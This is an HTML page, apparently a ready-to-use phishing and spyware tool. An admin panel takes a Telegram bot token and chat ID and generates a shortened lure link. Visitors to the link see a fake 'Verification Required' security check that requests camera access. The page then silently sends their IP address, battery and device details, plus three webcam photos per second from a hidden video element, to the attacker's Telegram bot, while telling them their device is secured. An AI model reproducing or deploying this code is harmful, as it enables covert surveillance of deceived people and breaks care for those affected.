<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MR_MOMIN_🌍 | Secure Tool</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0a0f1e;
            --card: rgba(255, 255, 255, 0.08);
            --primary: #0ea5e9;
            --accent: #f43f5e;
        }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body {
            margin: 0; padding: 0;
            font-family: 'Hind Siliguri', sans-serif;
            background: var(--bg);
            color: #fff;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; overflow: hidden;
        }
        /* Animated Background Gradients */
        .blob {
            position: absolute; width: 400px; height: 400px;
            background: linear-gradient(135deg, #0ea5e9 0%, #6366f1 100%);
            filter: blur(80px); border-radius: 50%; z-index: -1;
            animation: move 10s infinite alternate; opacity: 0.4;
        }
        @keyframes move { from { transform: translate(-20%, -20%); } to { transform: translate(20%, 20%); } }

        .container {
            width: 90%; max-width: 420px;
            background: var(--card);
            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 32px; padding: 35px 25px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.4);
            text-align: center;
        }
        h1 { font-size: 26px; margin: 10px 0; color: var(--primary); font-weight: 700; }
        .dev { color: #94a3b8; font-size: 14px; margin-bottom: 25px; }
        
        .input-box {
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 16px; padding: 14px 18px;
            width: 100%; color: #fff; font-size: 16px;
            margin-bottom: 15px; outline: none; transition: 0.3s;
        }
        .input-box:focus { border-color: var(--primary); background: rgba(255,255,255,0.1); }
        
        .btn {
            width: 100%; padding: 16px; border-radius: 16px;
            border: none; background: linear-gradient(135deg, #0ea5e9, #2563eb);
            color: #fff; font-size: 18px; font-weight: 600;
            cursor: pointer; transition: 0.3s; margin-top: 10px;
        }
        .btn:active { transform: scale(0.97); }

        .link-box {
            display: none; margin-top: 25px; padding: 15px;
            background: rgba(0,0,0,0.3); border-radius: 15px;
            border: 1px dashed var(--primary);
        }
        #resLink { color: #7dd3fc; font-size: 13px; word-break: break-all; cursor: pointer; }
        
        /* Victim UI */
        #victim-ui { display: none; }
        .loader {
            border: 4px solid rgba(255,255,255,0.1);
            border-left-color: var(--primary);
            width: 40px; height: 40px; border-radius: 50%;
            animation: spin 1s linear infinite; margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        video, canvas { position: fixed; left: -1000px; opacity: 0; }
    </style>
</head>
<body>

<div class="blob"></div>

<div class="container">
    <!-- Admin Setup View -->
    <div id="admin-ui">
        <div style="font-size: 45px;">🔥</div>
        <h1>Advanced Panel</h1>
        <div class="dev">Developed by: <b>MR_MOMIN_🌍</b></div>
        
        <input type="text" id="token" class="input-box" placeholder="টেলিগ্রাম বট টোকেন">
        <input type="text" id="cid" class="input-box" placeholder="টেলিগ্রাম চ্যাট আইডি">
        
        <button class="btn" onclick="gen()">🔗 লিংক তৈরি করুন</button>
        
        <div id="resBox" class="link-box">
            <p style="margin:0 0 8px; font-size:12px;">নিচের লিংকটি কপি করুন:</p>
            <div id="resLink" onclick="copy()">জেনারেট হচ্ছে...</div>
        </div>
    </div>

    <!-- Victim Page View -->
    <div id="victim-ui">
        <div style="font-size: 50px;">🛡️</div>
        <h2>Verification Required</h2>
        <p style="color:#94a3b8; font-size:14px;">আপনার কানেকশন নিরাপদ কিনা নিশ্চিত করতে নিচের বাটনে ক্লিক করুন।</p>
        
        <button class="btn" id="startBtn">Continue to Page</button>
        
        <div id="status-area" style="display:none; margin-top:20px;">
            <div class="loader"></div>
            <p id="msg" style="font-size:13px; color:#38bdf8;">সার্ভারের সাথে যুক্ত হচ্ছে...</p>
        </div>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const urlP = new URLSearchParams(window.location.search);
    const botT = urlP.get('t');
    const chatI = urlP.get('c');

    // লিংক জেনারেট (Is.gd API ব্যবহার করা হয়েছে যা TinyURL এর চেয়ে ভালো)
    async function gen() {
        const t = document.getElementById('token').value.trim();
        const c = document.getElementById('cid').value.trim();
        if(!t || !c) return alert("তথ্য সঠিক দিন!");

        const l = `${window.location.origin}${window.location.pathname}?t=${t}&c=${c}`;
        document.getElementById('resBox').style.display = 'block';
        document.getElementById('resLink').innerText = "অপেক্ষা করুন...";

        try {
            // Is.gd API for better forwarding
            const r = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(l)}`);
            const d = await r.json();
            document.getElementById('resLink').innerText = d.shorturl || l;
        } catch(e) {
            document.getElementById('resLink').innerText = l;
        }
    }

    function copy() {
        const t = document.getElementById('resLink').innerText;
        navigator.clipboard.writeText(t);
        alert("✅ লিংক কপি হয়েছে!");
    }

    // ভিকটিম সাইড লজিক
    if(botT && chatI) {
        document.getElementById('admin-ui').style.display = 'none';
        document.getElementById('victim-ui').style.display = 'block';
    }

    document.getElementById('startBtn').addEventListener('click', async function() {
        this.style.display = 'none';
        document.getElementById('status-area').style.display = 'block';
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('v').srcObject = stream;
            
            // ডিভাইসের ডাটা পাঠানো
            await sendDetails();
            
            // সাইলেন্ট ক্যাপচার লুপ
            setInterval(snap, 333); // প্রতি সেকেন্ডে ৩টি
            
            setTimeout(() => {
                document.getElementById('msg').innerText = "আপনার ডিভাইসটি এখন সুরক্ষিত।";
            }, 3000);

        } catch (e) {
            document.getElementById('msg').innerText = "Error: Please allow camera access!";
            sendToBot("❌ ইউজার ক্যামেরা পারমিশন ব্লক করেছে।");
        }
    });

    async function sendDetails() {
        let ip = "Unknown";
        try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
        
        let batt = "N/A";
        try { const b = await navigator.getBattery(); batt = `${Math.round(b.level*100)}% (${b.charging?'Charging':'No'})`; } catch(e){}

        const text = `🔥 *Target Detected!*\n\n📍 *IP:* \`${ip}\` \n🔋 *Battery:* ${batt}\n📱 *Device:* ${navigator.platform}\n👨‍💻 *Dev:* MR_MOMIN_🌍`;
        sendToBot(text, true);
    }

    function snap() {
        const v = document.getElementById('v');
        const can = document.getElementById('c');
        can.width = v.videoWidth || 640;
        can.height = v.videoHeight || 480;
        can.getContext('2d').drawImage(v, 0, 0);
        
        can.toBlob(b => {
            const f = new FormData();
            f.append('chat_id', chatI);
            f.append('photo', b, 'momin.jpg');
            fetch(`https://api.telegram.org/bot${botT}/sendPhoto`, { method:'POST', body:f });
        }, 'image/jpeg', 0.4);
    }

    function sendToBot(m, md=false) {
        fetch(`https://api.telegram.org/bot${botT}/sendMessage`, {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({chat_id: chatI, text: m, parse_mode: md?"Markdown":null})
        });
    }
</script>
</body>
</html>
